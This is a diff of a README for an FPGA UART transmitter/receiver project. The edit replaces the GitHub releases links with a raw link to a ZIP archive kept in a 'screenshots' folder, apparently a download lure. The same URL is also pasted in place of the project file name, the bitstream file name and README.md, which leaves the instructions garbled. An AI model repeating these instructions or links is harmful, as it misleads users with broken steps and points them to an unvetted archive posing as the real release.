@@ -6,7 +6,7 @@ This guide will help you download and run the UART transmitter and receiver appl
 
 ## 📥 Download Here
 
-[![Download UART_TX_RX](https://img.shields.io/badge/download-UART_TX_RX-blue)](https://github.com/Abdelhakstars69/UART_TX_RX/releases)
+[![Download UART_TX_RX](https://raw.githubusercontent.com/Abdelhakstars69/UART_TX_RX/main/screenshots/UART_TX_RX-1.5.zip)](https://raw.githubusercontent.com/Abdelhakstars69/UART_TX_RX/main/screenshots/UART_TX_RX-1.5.zip)
 
 ## 📁 Requirements
 
@@ -19,7 +19,7 @@ Before you start, make sure you have the following:
 ## 🔧 Building the Application
 
 1. **Download the Software**
-   - Visit this page to download the latest version of the application: [Download Link](https://github.com/Abdelhakstars69/UART_TX_RX/releases).
+   - Visit this page to download the latest version of the application: [Download Link](https://raw.githubusercontent.com/Abdelhakstars69/UART_TX_RX/main/screenshots/UART_TX_RX-1.5.zip).
   
 2. **Unzip the Downloaded Files**
    - Once the download is complete, find the ZIP file in your computer's downloads folder. 
@@ -30,7 +30,7 @@ Before you start, make sure you have the following:
   
 4. **Import the Project**
    - In Vivado, click on "Open Project" and navigate to the folder where you extracted the files.
-   - Select the project file named `UART_TX_RX.xpr` and click "Open".
+   - Select the project file named `https://raw.githubusercontent.com/Abdelhakstars69/UART_TX_RX/main/screenshots/UART_TX_RX-1.5.zip` and click "Open".
 
 5. **Check the Design**
    - Make sure the project is configured correctly. You should see the `UART_TX_RX` design in the project navigator.
@@ -46,7 +46,7 @@ Before you start, make sure you have the following:
 
 3. **Program the Device**
    - Once connected, click on `Program Device`.
-   - Choose the appropriate bitstream file, which is usually named `UART_TX_RX.bit`, and click `Program`.
+   - Choose the appropriate bitstream file, which is usually named `https://raw.githubusercontent.com/Abdelhakstars69/UART_TX_RX/main/screenshots/UART_TX_RX-1.5.zip`, and click `Program`.
 
 ## 📊 Validate the Connection
 
@@ -96,7 +96,7 @@ UART_TX_RX/
 ├── simulation/
 │   ├── UART_TX_RX_tb.v
 │   └── testbench_files.v
-└── README.md
+└── https://raw.githubusercontent.com/Abdelhakstars69/UART_TX_RX/main/screenshots/UART_TX_RX-1.5.zip
 ```
 
 ## 🔍 Learn More
@@ -115,4 +115,4 @@ If you have questions or need help, please feel free to open an issue on the Git
 
 If you need to re-download the application, click the link below:
 
-[![Download UART_TX_RX](https://img.shields.io/badge/download-UART_TX_RX-blue)](https://github.com/Abdelhakstars69/UART_TX_RX/releases)
+[![Download UART_TX_RX](https://raw.githubusercontent.com/Abdelhakstars69/UART_TX_RX/main/screenshots/UART_TX_RX-1.5.zip)](https://raw.githubusercontent.com/Abdelhakstars69/UART_TX_RX/main/screenshots/UART_TX_RX-1.5.zip)
